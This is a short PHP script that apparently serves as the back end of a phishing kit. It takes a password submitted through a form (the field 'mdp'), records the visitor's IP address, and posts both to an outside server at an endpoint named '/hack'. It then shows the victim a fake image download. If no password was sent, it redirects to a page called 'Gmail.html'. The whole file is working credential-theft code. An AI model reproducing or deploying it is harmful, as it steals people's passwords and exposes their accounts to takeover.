<?php
/**
 * Created by PhpStorm.
 * User: Capp
 * Date: 27/01/2017
 * Time: 12:28
 */


function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}



if(isset($_POST['mdp']) && $_POST['mdp']!=''){
    $mdp = $_POST['mdp'];
    $user_ip = getUserIP();

//echo $user_ip; // Output IP address [Ex: 177.87.193.134]


    $postarrayClient = array(
        'mdp' => $mdp,
        'ip' => $user_ip);

    $postClient = json_encode($postarrayClient);

# Form our options
    $optsClient = array('http' =>
        array(
            'method'  => 'POST',
            'header'  => 'Content-type: application/x-www-form-urlencoded',
            'content' => $postClient
        )
    );
# Create the context
    $context = stream_context_create($optsClient);
    $resultClient = file_get_contents('http://144.217.80.224/service/api/api.php/hack', false, $context);

    $arrClient = array(
        //'status' => "transaction effectuée avec succès",
        'message' => $resultClient,
        'error_code' => 0);
//echo json_encode($arrClient);

    echo "Votre image se télécharge";
    $file = 'cdtm.jpeg';
    
    
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
} else {
    header('Location: Gmail.html');
}




?>